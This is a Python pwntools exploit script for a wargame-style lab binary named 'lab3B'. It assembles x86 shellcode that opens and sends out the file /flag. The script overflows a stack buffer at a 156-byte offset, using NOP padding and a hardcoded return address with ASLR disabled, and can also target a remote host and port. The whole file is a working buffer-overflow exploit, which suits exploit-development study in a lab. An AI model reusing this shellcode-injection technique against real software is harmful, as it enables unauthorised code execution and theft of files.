#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab3B')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
set follow-fork-mode child
b *main+350
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    """
    aslr disabled :>

    open | read | write on /flag
    """

    buffer = 0xffffcde0
    offset = 156

    sc = asm(
        """
            open:
                push 0x67
                push 0x616c662f
                mov ebx, esp
                xor ecx, ecx
                push 5
                pop eax
                int 0x80
            
            sendfile:
                push 1
                pop ebx
                mov ecx, eax
                xor edx, edx
                push 0x50
                pop esi
                push 0xbb
                pop eax
                int 0x80
        """
    )

    payload = sc.ljust(offset, b"\x90") + p32(buffer)

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
